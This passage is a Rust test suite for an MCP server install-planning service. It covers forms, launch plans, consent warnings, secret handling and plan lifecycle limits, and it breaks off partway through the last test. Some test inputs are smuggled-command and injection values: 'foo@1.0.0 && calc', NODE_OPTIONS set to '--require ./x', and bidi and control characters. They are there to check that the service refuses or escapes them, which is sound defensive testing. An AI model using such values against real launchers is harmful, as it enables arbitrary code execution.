use std::collections::BTreeMap;
use std::time::Duration;

use serde_json::{json, Value};

use super::consent::{ConsentValue, ConsentWarning, Namespace};
use super::convert::{McpCatalogReason, OptionKind, Runner};
use super::form::{Field, FieldFormat, FieldTarget, Origin};
use super::plan::{
    CancelRequest, CommitRequest, FormReply, FormRequest, InstallPlan, PlanCaller, PlanChoice,
    PlanReply, PlanRequest, PlanSource,
};
use super::resolved::{Provenance, ResolvedConfig, ValueSlot};
use super::search::RunnerAvailability;
use super::snapshot::{item_from_row, LoadedCatalog, McpCatalogSource};
use super::McpCatalogService;

const ALL_RUNNERS: RunnerAvailability = RunnerAvailability {
    npx: true,
    uvx: true,
    docker: true,
    dotnet: true,
};

fn row(server: Value) -> Value {
    json!({
        "server": server,
        "_meta": { "io.modelcontextprotocol.registry/official": { "status": "active", "isLatest": true } }
    })
}

fn hooka() -> Value {
    row(json!({
        "name": "to.hooka/mcp",
        "title": "Hooka MCP",
        "description": "Hooka",
        "version": "0.1.2",
        "repository": { "url": "https://github.com/hooka/mcp", "id": "R_hooka" },
        "packages": [{
            "registryType": "npm",
            "identifier": "hooka-mcp",
            "version": "0.1.2",
            "transport": { "type": "stdio" },
            "environmentVariables": [
                { "name": "HOOKA_API_KEY", "isRequired": true, "isSecret": true, "description": "Your key" },
                { "name": "HOOKA_REGION", "default": "eu", "choices": ["eu", "us"] }
            ],
            "packageArguments": [
                { "type": "positional", "valueHint": "workspace", "isRequired": true, "placeholder": "acme" }
            ]
        }]
    }))
}

fn stata() -> Value {
    row(json!({
        "name": "io.github.tmonk/mcp-stata",
        "description": "Stata",
        "version": "1.0.4",
        "packages": [{
            "registryType": "pypi",
            "identifier": "mcp-stata",
            "version": "1.0.4",
            "transport": { "type": "stdio" },
            "packageArguments": [
                { "type": "named", "name": "--port", "format": "number" }
            ]
        }]
    }))
}

fn occultron() -> Value {
    row(json!({
        "name": "io.github.luckyjupiter/occultron",
        "description": "Occultron",
        "version": "0.1.0",
        "packages": [{
            "registryType": "oci",
            "identifier": "ghcr.io/luckyjupiter/occultron-mcp:0.1.0",
            "transport": { "type": "stdio" },
            "environmentVariables": [
                { "name": "OCCULTRON_TOKEN", "isSecret": true }
            ]
        }]
    }))
}

fn time_nuget() -> Value {
    row(json!({
        "name": "io.github.domdomegg/time-mcp-nuget",
        "description": "Time",
        "version": "1.1.1",
        "packages": [{
            "registryType": "nuget",
            "identifier": "TimeMcpServer",
            "version": "1.1.1",
            "transport": { "type": "stdio" },
            "environmentVariables": [
                { "name": "TZ_UTC", "format": "boolean", "isRequired": true }
            ]
        }]
    }))
}

fn tre() -> Value {
    row(json!({
        "name": "com.tre-app/tre",
        "description": "Tre",
        "version": "0.2.0",
        "remotes": [{
            "type": "streamable-http",
            "url": "https://tre-app.com/api/{region}/mcp",
            "variables": { "region": { "default": "eu", "choices": ["eu", "us"] } },
            "headers": [
                { "name": "Authorization", "value": "Bearer {token}",
                  "variables": { "token": { "isSecret": true, "isRequired": true } } },
                { "name": "X-Client", "value": "termul" }
            ]
        }]
    }))
}

fn catalog(rows: Vec<Value>) -> LoadedCatalog {
    let mut items: Vec<_> = rows.into_iter().filter_map(item_from_row).collect();
    items.sort_by(|a, b| a.name.cmp(&b.name));
    LoadedCatalog {
        items,
        source: McpCatalogSource {
            updated_at: Some("2026-10-27T00:00:00Z".to_string()),
            sample: false,
        },
    }
}

fn fixture() -> LoadedCatalog {
    catalog(vec![hooka(), stata(), occultron(), time_nuget(), tre()])
}

fn service() -> McpCatalogService {
    McpCatalogService::with_runners(fixture(), ALL_RUNNERS)
}

fn caller() -> PlanCaller {
    PlanCaller::Connection("conn-1".to_string())
}

fn catalog_source(name: &str, version: &str) -> PlanSource {
    PlanSource::Catalog {
        name: name.to_string(),
        version: version.to_string(),
    }
}

fn import_source(json: &str) -> PlanSource {
    PlanSource::Import {
        json: json.to_string(),
        server: None,
    }
}

fn inputs(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
    pairs
        .iter()
        .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
        .collect()
}

async fn plan_with(
    service: &McpCatalogService,
    source: PlanSource,
    choice: Option<PlanChoice>,
    values: &[(&str, &str)],
) -> Result<PlanReply, super::McpCatalogError> {
    service
        .plan_install(
            &PlanRequest {
                source,
                choice,
                inputs: inputs(values),
            },
            caller(),
        )
        .await
}

async fn plan(
    service: &McpCatalogService,
    source: PlanSource,
    values: &[(&str, &str)],
) -> InstallPlan {
    match plan_with(service, source, None, values).await {
        Ok(PlanReply::Plan { plan }) => *plan,
        other => panic!("expected a plan, got {other:?}"),
    }
}

async fn unsupported(service: &McpCatalogService, source: PlanSource) -> McpCatalogReason {
    match plan_with(service, source, None, &[]).await {
        Ok(PlanReply::Unsupported { reason }) => reason,
        other => panic!("expected unsupported, got {other:?}"),
    }
}

fn commit(
    service: &McpCatalogService,
    plan: &InstallPlan,
    secrets: &[(&str, &str)],
) -> Result<super::CommitResult, super::McpCatalogError> {
    service.commit_install(
        &CommitRequest {
            plan_id: plan.plan_id.clone(),
            launch_digest: plan.launch_digest.clone(),
            secret_values: inputs(secrets),
        },
        &caller(),
    )
}

fn slot(name: &str, is_secret: bool) -> ValueSlot {
    ValueSlot {
        name: name.to_string(),
        is_secret,
    }
}

fn strings(items: &[&str]) -> Vec<String> {
    items.iter().map(|s| (*s).to_string()).collect()
}

#[tokio::test]
async fn the_form_has_one_field_per_input_and_template_variable() {
    let reply = service()
        .describe_install(&FormRequest {
            source: catalog_source("com.tre-app/tre", "0.2.0"),
            choice: None,
        })
        .await
        .unwrap();
    let FormReply::Form { form } = reply else {
        panic!("expected a form, got {reply:?}");
    };
    assert_eq!(form.title, "com.tre-app/tre");
    assert_eq!(
        form.choice, None,
        "the request's choice is echoed; the default option is picked on the host"
    );
    assert_eq!(
        form.fields,
        vec![
            Field {
                id: "url/region".to_string(),
                label: "region".to_string(),
                target: FieldTarget::Url,
                variable: Some("region".to_string()),
                is_required: true,
                is_secret: false,
                format: FieldFormat::String,
                choices: Some(strings(&["eu", "us"])),
                default: Some("eu".to_string()),
                placeholder: None,
                description: None,
            },
            Field {
                id: "header/Authorization/token".to_string(),
                label: "token".to_string(),
                target: FieldTarget::Header {
                    name: "Authorization".to_string()
                },
                variable: Some("token".to_string()),
                is_required: true,
                is_secret: true,
                format: FieldFormat::String,
                choices: None,
                default: None,
                placeholder: None,
                description: None,
            },
        ]
    );
}

#[tokio::test]
async fn the_hooka_form_masks_the_secret_and_labels_the_positional_argument() {
    let reply = service()
        .describe_install(&FormRequest {
            source: catalog_source("to.hooka/mcp", "0.1.2"),
            choice: Some(PlanChoice {
                kind: OptionKind::Package,
                index: 0,
            }),
        })
        .await
        .unwrap();
    let FormReply::Form { form } = reply else {
        panic!("expected a form, got {reply:?}");
    };
    assert_eq!(form.title, "Hooka MCP");
    let ids: Vec<(&str, &str, bool, bool)> = form
        .fields
        .iter()
        .map(|f| (f.id.as_str(), f.label.as_str(), f.is_secret, f.is_required))
        .collect();
    assert_eq!(
        ids,
        vec![
            ("env/HOOKA_API_KEY", "HOOKA_API_KEY", true, true),
            ("env/HOOKA_REGION", "HOOKA_REGION", false, false),
            ("arg/0", "workspace", false, true),
        ]
    );
    assert_eq!(form.fields[2].placeholder.as_deref(), Some("acme"));
    assert_eq!(form.fields[0].description.as_deref(), Some("Your key"));
}

#[tokio::test]
async fn a_missing_runner_is_unsupported_for_form_and_plan() {
    let service = McpCatalogService::with_runners(
        fixture(),
        RunnerAvailability {
            npx: false,
            ..ALL_RUNNERS
        },
    );
    let reply = service
        .describe_install(&FormRequest {
            source: catalog_source("to.hooka/mcp", "0.1.2"),
            choice: None,
        })
        .await
        .unwrap();
    assert_eq!(
        reply,
        FormReply::Unsupported {
            reason: McpCatalogReason::NeedsRuntime {
                runtime: Runner::Npx
            }
        }
    );
    assert_eq!(
        unsupported(&service, catalog_source("to.hooka/mcp", "0.1.2")).await,
        McpCatalogReason::NeedsRuntime {
            runtime: Runner::Npx
        }
    );
}

#[tokio::test]
async fn an_unknown_item_or_another_version_is_not_found() {
    let service = service();
    let missing = plan_with(
        &service,
        catalog_source("io.example/none", "1.0.0"),
        None,
        &[],
    )
    .await
    .unwrap_err();
    assert_eq!(missing.code, "MCP_CATALOG_NOT_FOUND");
    let stale = plan_with(&service, catalog_source("to.hooka/mcp", "0.1.1"), None, &[])
        .await
        .unwrap_err();
    assert_eq!(stale.code, "MCP_CATALOG_NOT_FOUND");
    assert_eq!(
        stale.message,
        "the catalog holds version 0.1.2 of `to.hooka/mcp`, not 0.1.1"
    );
}

#[tokio::test]
async fn reapprove_and_upgrade_are_not_available_yet() {
    let service = service();
    for source in [
        PlanSource::Reapprove {
            entry_id: "e1".to_string(),
        },
        PlanSource::Upgrade {
            entry_id: "e1".to_string(),
            version: "2.0.0".to_string(),
        },
    ] {
        let error = plan_with(&service, source, None, &[]).await.unwrap_err();
        assert_eq!(error.code, "MCP_PLAN_NOT_AVAILABLE");
    }
}

#[tokio::test]
async fn npm_plan_appends_the_positional_argument_and_lists_env_slots() {
    let service = service();
    let plan = plan(
        &service,
        catalog_source("to.hooka/mcp", "0.1.2"),
        &[("arg/0", "acme")],
    )
    .await;
    assert_eq!(plan.name, "hooka-mcp");
    assert_eq!(
        plan.config,
        ResolvedConfig::Stdio {
            command: "npx".to_string(),
            args: strings(&["-y", "hooka-mcp@0.1.2", "acme"]),
            env: vec![slot("HOOKA_API_KEY", true), slot("HOOKA_REGION", false)],
        }
    );
    let view = &plan.consent_view;
    assert_eq!(view.transport, "stdio");
    assert_eq!(view.command.as_deref(), Some("npx"));
    assert_eq!(
        view.argv,
        strings(&["npx", "-y", "hooka-mcp@0.1.2", "acme"])
    );
    assert_eq!(
        view.env,
        vec![
            ConsentValue {
                name: "HOOKA_API_KEY".to_string(),
                value: None,
                is_secret: true,
                origin: Origin::User,
            },
            ConsentValue {
                name: "HOOKA_REGION".to_string(),
                value: Some("eu".to_string()),
                is_secret: false,
                origin: Origin::Registry,
            },
        ]
    );
    assert_eq!(view.warnings, vec![ConsentWarning::RunsLocalCode]);
    let provenance = view.provenance.as_ref().expect("catalog provenance");
    assert_eq!(
        provenance.namespace,
        Namespace::Domain {
            domain: "to.hooka".to_string()
        }
    );
    assert_eq!(
        provenance.repository_url.as_deref(),
        Some("https://github.com/hooka/mcp")
    );
    assert_eq!(provenance.version, "0.1.2");
    assert!(!provenance.mutable_tag);
    assert_eq!(
        provenance.snapshot_fetched_at.as_deref(),
        Some("2026-10-27T00:00:00Z")
    );
    assert_eq!(plan.form.len(), 3);
    assert!(plan.launch_digest.starts_with("sha256:"));
}

#[tokio::test]
async fn pypi_plan_validates_the_number_and_drops_an_empty_optional_named_argument() {
    let service = service();
    let with_port = plan(
        &service,
        catalog_source("io.github.tmonk/mcp-stata", "1.0.4"),
        &[("arg/0", "8080")],
    )
    .await;
    assert_eq!(
        with_port.config,
        ResolvedConfig::Stdio {
            command: "uvx".to_string(),
            args: strings(&["mcp-stata@1.0.4", "--port", "8080"]),
            env: vec![],
        }
    );
    let without = plan(
        &service,
        catalog_source("io.github.tmonk/mcp-stata", "1.0.4"),
        &[],
    )
    .await;
    assert_eq!(
        without.config,
        ResolvedConfig::Stdio {
            command: "uvx".to_string(),
            args: strings(&["mcp-stata@1.0.4"]),
            env: vec![],
        }
    );
    let bad = plan_with(
        &service,
        catalog_source("io.github.tmonk/mcp-stata", "1.0.4"),
        None,
        &[("arg/0", "eighty")],
    )
    .await
    .unwrap_err();
    assert_eq!(bad.code, "VALIDATION_ERROR");
    assert_eq!(bad.message, "`arg/0` must be a number");
}

#[tokio::test]
async fn oci_plan_warns_about_a_mutable_tag_and_passes_env_names_to_docker() {
    let service = service();
    let plan = plan(
        &service,
        catalog_source("io.github.luckyjupiter/occultron", "0.1.0"),
        &[],
    )
    .await;
    assert_eq!(
        plan.config,
        ResolvedConfig::Stdio {
            command: "docker".to_string(),
            args: strings(&[
                "run",
                "-i",
                "--rm",
                "-e",
                "OCCULTRON_TOKEN",
                "ghcr.io/luckyjupiter/occultron-mcp:0.1.0"
            ]),
            env: vec![slot("OCCULTRON_TOKEN", true)],
        }
    );
    assert_eq!(
        plan.consent_view.warnings,
        vec![ConsentWarning::RunsLocalCode, ConsentWarning::MutableTag]
    );
    assert_eq!(
        plan.consent_view.provenance.as_ref().unwrap().namespace,
        Namespace::Github {
            account: "luckyjupiter".to_string()
        }
    );
}

#[tokio::test]
async fn nuget_plan_validates_the_boolean_env_on_the_host() {
    let service = service();
    let source = catalog_source("io.github.domdomegg/time-mcp-nuget", "1.1.1");
    let bad = plan_with(&service, source.clone(), None, &[("env/TZ_UTC", "yes")])
        .await
        .unwrap_err();
    assert_eq!(bad.code, "VALIDATION_ERROR");
    assert_eq!(bad.message, "`env/TZ_UTC` must be `true` or `false`");
    let plan = plan(&service, source, &[("env/TZ_UTC", "true")]).await;
    assert_eq!(
        plan.config,
        ResolvedConfig::Stdio {
            command: "dotnet".to_string(),
            args: strings(&["dnx", "TimeMcpServer@1.1.1", "--yes"]),
            env: vec![slot("TZ_UTC", false)],
        }
    );
    assert_eq!(plan.consent_view.env[0].value.as_deref(), Some("true"));
}

#[tokio::test]
async fn remote_plan_bakes_the_url_variable_and_composes_the_secret_header_at_commit() {
    let service = service();
    let plan = plan(
        &service,
        catalog_source("com.tre-app/tre", "0.2.0"),
        &[("url/region", "us")],
    )
    .await;
    assert_eq!(
        plan.config,
        ResolvedConfig::Http {
            url: "https://tre-app.com/api/us/mcp".to_string(),
            headers: vec![slot("Authorization", true), slot("X-Client", false)],
        }
    );
    let view = &plan.consent_view;
    assert_eq!(view.transport, "http");
    assert_eq!(view.url.as_deref(), Some("https://tre-app.com/api/us/mcp"));
    assert_eq!(view.argv, Vec::<String>::new());
    assert_eq!(
        view.headers,
        vec![
            ConsentValue {
                name: "Authorization".to_string(),
                value: None,
                is_secret: true,
                origin: Origin::User,
            },
            ConsentValue {
                name: "X-Client".to_string(),
                value: Some("termul".to_string()),
                is_secret: false,
                origin: Origin::Registry,
            },
        ]
    );
    assert_eq!(view.warnings, vec![ConsentWarning::SendsDataRemote]);

    let result = commit(&service, &plan, &[("header/Authorization/token", "t0k")]).unwrap();
    assert_eq!(result.name, "tre");
    assert_eq!(result.config, plan.config);
    assert_eq!(result.launch_digest, plan.launch_digest);
    assert_eq!(
        result
            .secrets
            .iter()
            .map(|s| (s.slot, s.name.as_str(), s.value.as_str()))
            .collect::<Vec<_>>(),
        vec![
            (super::SecretSlot::Header, "Authorization", "Bearer t0k"),
            (super::SecretSlot::Header, "X-Client", "termul"),
        ]
    );
    assert_eq!(
        result.provenance,
        Some(Provenance {
            name: "com.tre-app/tre".to_string(),
            version: "0.2.0".to_string(),
            kind: OptionKind::Remote,
            index: 0,
            repository_id: None,
        })
    );
}

#[tokio::test]
async fn a_required_field_left_empty_fails_plan_creation() {
    let service = service();
    let error = plan_with(&service, catalog_source("to.hooka/mcp", "0.1.2"), None, &[])
        .await
        .unwrap_err();
    assert_eq!(error.code, "VALIDATION_ERROR");
    assert_eq!(error.message, "`arg/0` is required");
    assert_eq!(service.stored_plans(), 0);
}

#[tokio::test]
async fn a_choice_outside_the_listed_values_or_a_secret_at_plan_time_is_refused() {
    let service = service();
    let source = catalog_source("to.hooka/mcp", "0.1.2");
    let choice = plan_with(
        &service,
        source.clone(),
        None,
        &[("arg/0", "acme"), ("env/HOOKA_REGION", "mars")],
    )
    .await
    .unwrap_err();
    assert_eq!(
        choice.message,
        "`env/HOOKA_REGION` must be one of the listed choices"
    );
    let secret = plan_with(
        &service,
        source,
        None,
        &[("arg/0", "acme"), ("env/HOOKA_API_KEY", "hk")],
    )
    .await
    .unwrap_err();
    assert_eq!(secret.code, "VALIDATION_ERROR");
    assert_eq!(
        secret.message,
        "`env/HOOKA_API_KEY` is secret; send it at commit"
    );
}

#[tokio::test]
async fn an_import_with_a_denied_env_name_is_unsupported_with_the_typed_reason() {
    let service = service();
    let reason = unsupported(
        &service,
        import_source(
            r#"{"mcpServers":{"evil":{"command":"npx","args":["-y","foo@1.0.0"],"env":{"NODE_OPTIONS":"--require ./x"}}}}"#,
        ),
    )
    .await;
    assert_eq!(
        reason,
        McpCatalogReason::DeniedEnv {
            name: "NODE_OPTIONS".to_string()
        }
    );
}

#[tokio::test]
async fn an_import_breaking_the_grammar_or_carrying_a_control_char_is_unsupported() {
    let service = service();
    let shell_meta = unsupported(
        &service,
        import_source(r#"{"command":"npx","args":["-y","foo@1.0.0 && calc"]}"#),
    )
    .await;
    assert_eq!(shell_meta, McpCatalogReason::InvalidPackage);
    let control = unsupported(
        &service,
        import_source("{\"command\":\"node\",\"args\":[\"srv.js\",\"a\\u0007b\"]}"),
    )
    .await;
    assert_eq!(
        control,
        McpCatalogReason::ControlCharacter {
            field: "args[1]".to_string()
        }
    );
    let flag = unsupported(&service, import_source(r#"{"command":"--rm","args":[]}"#)).await;
    assert_eq!(flag, McpCatalogReason::InvalidCommand);
}

#[tokio::test]
async fn a_malformed_import_is_an_import_error_not_a_plan() {
    let service = service();
    for (json, message) in [
        ("{not json", "the import is not valid JSON"),
        ("[]", "the import must be a JSON object"),
        (r#"{"mcpServers":{}}"#, "the import has no servers"),
        (
            r#"{"mcpServers":{"a":{"command":"x"},"b":{"command":"y"}}}"#,
            "the import has 2 servers (a, b); pass `server` to pick one",
        ),
        (
            r#"{"mcpServers":{"a":{"command":"x","env":"nope"}}}"#,
            "server `a`: `env` has the wrong shape",
        ),
    ] {
        let error = plan_with(&service, import_source(json), None, &[])
            .await
            .unwrap_err();
        assert_eq!(error.code, "MCP_IMPORT_INVALID", "{json}");
        assert_eq!(error.message, message, "{json}");
    }
}

#[tokio::test]
async fn a_clean_import_shows_every_file_value_verbatim_and_commits_without_secrets() {
    let service = service();
    let plan = plan(
        &service,
        PlanSource::Import {
            json: r#"{"mcpServers":{"notes":{"command":"node","args":["srv.js","--root","C:\\notes"],"env":{"NOTES_TOKEN":"from-file"}},"other":{"command":"x"}}}"#.to_string(),
            server: Some("notes".to_string()),
        },
        &[],
    )
    .await;
    assert_eq!(plan.name, "notes");
    assert_eq!(plan.form, vec![]);
    assert_eq!(
        plan.config,
        ResolvedConfig::Stdio {
            command: "node".to_string(),
            args: strings(&["srv.js", "--root", "C:\\notes"]),
            env: vec![slot("NOTES_TOKEN", false)],
        }
    );
    let view = &plan.consent_view;
    assert_eq!(
        view.argv,
        strings(&["node", "srv.js", "--root", "C:\\\\notes"])
    );
    assert_eq!(
        view.env,
        vec![ConsentValue {
            name: "NOTES_TOKEN".to_string(),
            value: Some("from-file".to_string()),
            is_secret: false,
            origin: Origin::File,
        }]
    );
    assert_eq!(
        view.warnings,
        vec![ConsentWarning::RunsLocalCode, ConsentWarning::FromFile]
    );
    assert_eq!(view.provenance, None);

    let result = commit(&service, &plan, &[]).unwrap();
    assert_eq!(result.provenance, None);
    assert_eq!(
        result
            .secrets
            .iter()
            .map(|s| (s.name.as_str(), s.value.as_str()))
            .collect::<Vec<_>>(),
        vec![("NOTES_TOKEN", "from-file")]
    );
}

#[tokio::test]
async fn a_remote_import_keeps_its_headers_and_transport() {
    let service = service();
    let plan = plan(
        &service,
        import_source(
            r#"{"type":"sse","url":"https://mcp.example.com/sse","headers":{"X-Key":"k1"}}"#,
        ),
        &[],
    )
    .await;
    assert_eq!(plan.name, "imported");
    assert_eq!(
        plan.config,
        ResolvedConfig::Sse {
            url: "https://mcp.example.com/sse".to_string(),
            headers: vec![slot("X-Key", false)],
        }
    );
    assert_eq!(plan.consent_view.transport, "sse");
    assert_eq!(plan.consent_view.headers[0].value.as_deref(), Some("k1"));
    let local = unsupported(
        &service,
        import_source(r#"{"url":"http://localhost:3000/mcp"}"#),
    )
    .await;
    assert_eq!(local, McpCatalogReason::InsecureUrl);
}

#[tokio::test]
async fn consent_view_escapes_bidi_and_control_characters_in_argv() {
    let service = service();
    let plan = plan(
        &service,
        catalog_source("to.hooka/mcp", "0.1.2"),
        &[("arg/0", "ac\u{202E}me\u{0007}")],
    )
    .await;
    assert_eq!(plan.consent_view.argv[3], "ac\\u{202E}me\\u{0007}");
    match &plan.config {
        ResolvedConfig::Stdio { args, .. } => assert_eq!(args[2], "ac\u{202E}me\u{0007}"),
        other => panic!("{other:?}"),
    }
}

#[tokio::test]
async fn a_plan_commits_once() {
    let service = service();
    let plan = plan(
        &service,
        catalog_source("to.hooka/mcp", "0.1.2"),
        &[("arg/0", "acme")],
    )
    .await;
    let first = commit(&service, &plan, &[("env/HOOKA_API_KEY", "hk_live_1")]).unwrap();
    assert_eq!(
        first
            .secrets
            .iter()
            .map(|s| (s.slot, s.name.as_str(), s.value.as_str()))
            .collect::<Vec<_>>(),
        vec![
            (super::SecretSlot::Env, "HOOKA_API_KEY", "hk_live_1"),
            (super::SecretSlot::Env, "HOOKA_REGION", "eu"),
        ]
    );
    assert!(!format!("{first:?}").contains("hk_live_1"));
    assert_eq!(first.name, "hooka-mcp");
    assert_eq!(first.launch_digest, plan.launch_digest);
    let second = commit(&service, &plan, &[("env/HOOKA_API_KEY", "hk_live_1")]).unwrap_err();
    assert_eq!(second.code, "MCP_PLAN_CONSUMED");
}

#[tokio::test]
async fn an_expired_plan_is_refused() {
    let service = McpCatalogService::with_runners_and_ttl(fixture(), ALL_RUNNERS, Duration::ZERO);
    let plan = plan(
        &service,
        catalog_source("to.hooka/mcp", "0.1.2"),
        &[("arg/0", "acme")],
    )
    .await;
    let error = commit(&service, &plan, &[("env/HOOKA_API_KEY", "hk")]).unwrap_err();
    assert_eq!(error.code, "MCP_PLAN_EXPIRED");
    let again = commit(&service, &plan, &[("env/HOOKA_API_KEY", "hk")]).unwrap_err();
    assert_eq!(again.code, "MCP_PLAN_NOT_FOUND");
}

#[tokio::test]
async fn a_plan_answers_only_its_caller() {
    let service = service();
    let plan = plan(
        &service,
        catalog_source("to.hooka/mcp", "0.1.2"),
        &[("arg/0", "acme")],
    )
    .await;
    let other = PlanCaller::Client("tab-9".to_string());
    let request = CommitRequest {
        plan_id: plan.plan_id.clone(),
        launch_digest: plan.launch_digest.clone(),
        secret_values: inputs(&[("env/HOOKA_API_KEY", "hk")]),
    };
    assert_eq!(
        service.commit_install(&request, &other).unwrap_err().code,
        "MCP_PLAN_WRONG_CALLER"
    );
    let cancel = CancelRequest {
        plan_id: plan.plan_id.clone(),
    };
    assert_eq!(
        service.cancel_install(&cancel, &other).unwrap_err().code,
        "MCP_PLAN_WRONG_CALLER"
    );
    assert!(service.commit_install(&request, &caller()).is_ok());
}

#[tokio::test]
async fn a_digest_mismatch_is_refused_and_discards_the_plan() {
    let service = service();
    let plan = plan(
        &service,
        catalog_source("to.hooka/mcp", "0.1.2"),
        &[("arg/0", "acme")],
    )
    .await;
    let error = service
        .commit_install(
            &CommitRequest {
                plan_id: plan.plan_id.clone(),
                launch_digest: "sha256:0000".to_string(),
                secret_values: inputs(&[("env/HOOKA_API_KEY", "hk")]),
            },
            &caller(),
        )
        .unwrap_err();
    assert_eq!(error.code, "MCP_PLAN_MISMATCH");
    assert_eq!(
        commit(&service, &plan, &[("env/HOOKA_API_KEY", "hk")])
            .unwrap_err()
            .code,
        "MCP_PLAN_NOT_FOUND"
    );
}

#[tokio::test]
async fn a_bad_secret_value_keeps_the_plan_for_another_try() {
    let service = service();
    let plan = plan(
        &service,
        catalog_source("to.hooka/mcp", "0.1.2"),
        &[("arg/0", "acme")],
    )
    .await;
    let missing = commit(&service, &plan, &[]).unwrap_err();
    assert_eq!(missing.code, "VALIDATION_ERROR");
    assert_eq!(missing.message, "`env/HOOKA_API_KEY` is required");
    let not_secret = commit(&service, &plan, &[("arg/0", "x")]).unwrap_err();
    assert_eq!(
        not_secret.message,
        "`arg/0` is not secret; commit accepts secret values only"
    );
    assert!(commit(&service, &plan, &[("env/HOOKA_API_KEY", "hk")]).is_ok());
}

#[tokio::test]
async fn cancel_drops_the_plan_and_is_idempotent() {
    let service = service();
    let plan = plan(
        &service,
        catalog_source("to.hooka/mcp", "0.1.2"),
        &[("arg/0", "acme")],
    )
    .await;
    let cancel = CancelRequest {
        plan_id: plan.plan_id.clone(),
    };
    assert!(service.cancel_install(&cancel, &caller()).is_ok());
    assert!(service.cancel_install(&cancel, &caller()).is_ok());
    assert_eq!(service.stored_plans(), 0);
    assert_eq!(
        commit(&service, &plan, &[("env/HOOKA_API_KEY", "hk")])
            .unwrap_err()
            .code,
        "MCP_PLAN_NOT_FOUND"
    );
}

#[tokio::test]
async fn the_digest_follows_the_launch_spec_not_the_secret_values() {
    let service = service();
    let source = catalog_source("to.hooka/mcp", "0.1.2");
    let a = plan(&service, source.clone(), &[("arg/0", "acme")]).await;
    let b = plan(&service, source.clone(), &[("arg/0", "acme")]).await;
    assert_eq!(a.launch_digest, b.launch_digest);
    let other_arg = plan(&service, source, &[("arg/0", "globex")]).await;
    assert_ne!(other_arg.launch_digest, a.launch_digest);
    let committed_a = commit(&service, &a, &[("env/HOOKA_API_KEY", "k-one")]).unwrap();
    let committed_b = commit(&service, &b, &[("env/HOOKA_API_KEY", "k-two")]).unwrap();
    assert_eq!(committed_a.launch_digest, committed_b.launch_digest);
    assert_eq!(committed_a.launch_digest, a.launch_digest);
}

#[tokio::test]
async fn the_plan_serializes_to_the_wire_contract() {
    let service = service();
    let plan = plan(
        &service,
        catalog_source("to.hooka/mcp", "0.1.2"),
        &[("arg/0", "acme")],
    )
    .await;
    let json = serde_json::to_value(&plan).unwrap();
    assert_eq!(
        json["source"],
        json!({ "kind": "catalog", "name": "to.hooka/mcp", "version": "0.1.2" })
    );
    assert_eq!(json["choice"], Value::Null);
    assert!(json["expiresAt"].as_str().unwrap().ends_with('Z'));
    assert_eq!(json["config"]["transport"], "stdio");
    assert_eq!(
        json["config"]["env"][0],
        json!({ "name": "HOOKA_API_KEY", "isSecret": true })
    );
    assert_eq!(
        json["form"][2]["target"],
        json!({ "kind": "argument", "index": 0, "name": null })
    );
    assert_eq!(json["consentView"]["warnings"], json!(["runs-local-code"]));
    assert_eq!(
        json["consentView"]["provenance"]["namespace"],
        json!({ "kind": "domain", "domain": "to.hooka" })
    );
    assert_eq!(json["consentView"]["env"][0]["origin"], "user");
    let unsupported = serde_json::to_value(PlanReply::Unsupported {
        reason: McpCatalogReason::DeniedEnv {
            name: "PATH".to_string(),
        },
    })
    .unwrap();
    assert_eq!(
        unsupported,
        json!({ "outcome": "unsupported", "reason": { "code": "denied-env", "name": "PATH" } })
    );
}

#[tokio::test]
async fn a_typed_value_is_the_users_and_an_untouched_default_the_registrys() {
    let service = service();
    let typed = plan(
        &service,
        catalog_source("to.hooka/mcp", "0.1.2"),
        &[("arg/0", "acme"), ("env/HOOKA_REGION", "us")],
    )
    .await;
    let region = &typed.consent_view.env[1];
    assert_eq!(
        (region.value.as_deref(), region.origin),
        (Some("us"), Origin::User)
    );
}

#[tokio::test]
async fn a_secret_fields_registry_default_never_leaves_the_host() {
    let leaky = row(json!({
        "name": "io.example/leaky",
        "description": "Leaky",
        "version": "1.0.0",
        "packages": [{
            "registryType": "npm",
            "identifier": "leaky-mcp",
            "version": "1.0.0",
            "environmentVariables": [
                { "name": "LEAKY_KEY", "isSecret": true, "default": "sk-shipped-in-registry" }
            ]
        }]
    }));
    let service = McpCatalogService::with_runners(catalog(vec![leaky]), ALL_RUNNERS);
    let reply = service
        .describe_install(&FormRequest {
            source: catalog_source("io.example/leaky", "1.0.0"),
            choice: None,
        })
        .await
        .unwrap();
    let json = serde_json::to_string(&reply).unwrap();
    assert!(!json.contains("sk-shipped-in-registry"), "{json}");
    let plan = plan(&service, catalog_source("io.example/leaky", "1.0.0"), &[]).await;
    assert_eq!(
        commit(&service, &plan, &[]).unwrap_err().message,
        "`env/LEAKY_KEY` is required"
    );
}

#[tokio::test]
async fn a_caller_over_its_quota_loses_its_own_oldest_plan_not_anothers() {
    let service = service();
    let other = PlanCaller::Connection("conn-2".to_string());
    let request = PlanRequest {
        source: catalog_source("to.hooka/mcp", "0.1.2"),
        choice: None,
        inputs: inputs(&[("arg/0", "acme")]),
    };
    let theirs = match service.plan_install(&request, other.clone()).await.unwrap() {
        PlanReply::Plan { plan } => plan,
        reply => panic!("{reply:?}"),
    };
    let source = || catalog_source("to.hooka/mcp", "0.1.2");
    let first = plan(&service, source(), &[("arg/0", "acme")]).await;
    for _ in 0..16 {
        plan(&service, source(), &[("arg/0", "acme")]).await;
    }
    assert_eq!(service.stored_plans(), 17);
    assert_eq!(
        commit(&service, &first, &[("env/HOOKA_API_KEY", "hk")])
            .unwrap_err()
            .code,
        "MCP_PLAN_NOT_FOUND"
    );
    let commit_theirs = CommitRequest {
        plan_id: theirs.plan_id.clone(),
        launch_digest: theirs.launch_digest.clone(),
        secret_values: inputs(&[("env/HOOKA_API_KEY", "hk")]),
    };
    assert!(service.commit_install(&commit_theirs, &other).is_ok());
}

#[tokio::test]
async fn a_full_store_refuses_new_plans_instead_of_evicting_live_ones() {
    let service = service();
    let request = PlanRequest {
        source: catalog_source("to.hooka/mcp", "0.1.2"),
        choice: None,
        inputs: inputs(&[("arg/0", "acme")]),
    };
    for connection in 0..16 {
        let caller = PlanCaller::Connection(format!("conn-{connection}"));
        for _ in 0..16 {
            service.plan_install(&request, caller.clone()).await.unwrap();
        }
    }
    let error = service
        .plan_install(&request, PlanCaller::Connection("late".to_string()))
        .await
        .unwrap_err();
    assert_eq!(error.code, "MCP_PLAN_LIMIT");
    assert_eq!(service.stored_plans(), 256);
}

#[tokio::test]
async fn an_oversized_plan_request_is_refused_before_parsing() {
    let service = service();
    let big = format!(
        r#"{{"command":"node","args":["{}"]}}"#,
